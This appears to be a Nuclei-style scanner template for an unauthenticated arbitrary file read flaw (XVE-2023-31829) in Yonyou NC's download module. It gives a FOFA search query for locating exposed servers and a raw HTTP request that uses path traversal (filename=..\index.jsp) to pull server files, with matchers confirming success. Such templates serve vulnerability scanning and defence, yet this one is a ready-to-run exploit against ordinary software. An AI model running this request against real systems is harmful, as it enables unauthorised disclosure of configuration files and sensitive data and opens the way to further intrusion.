id: yongyouNC-download-File-reading-XVE-2023-31829

info:
  name: "用友 NC download 模块任意文件读取漏洞 (XVE-2023-31829)"
  author: Unknown
  severity: high
  description: |-
    fofa: app="用友-UFIDA-NC"
    用友NC 系统的 download 模块存在任意文件读取安全缺陷。攻击者可通过构造特定路径参数，无需身份验证即可访问受限文件资源，导致系统配置文件、敏感数据等机密信息泄露，可能引发后续权限提升或横向渗透攻击。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488084&idx=1&sn=72f941bb5d5d582e1a7f4c057bb27d9e&chksm=c267a767f5102e71dfe35093db374478d19ef696fa71ac5a48bf1c3e5bba15dc6833c261e830&token=1431500657&lang=zh_CN#rd
  tags: 用友NC



http:
- raw:
  - |
    GET /portal/pt/xml/file/download?pageId=login&filename=..\index.jsp HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'request.getSession(true)'
    - 'response.addHeader("Cache-Control", "no-store")'
    condition: and
  - type: status
    status:
    - 200





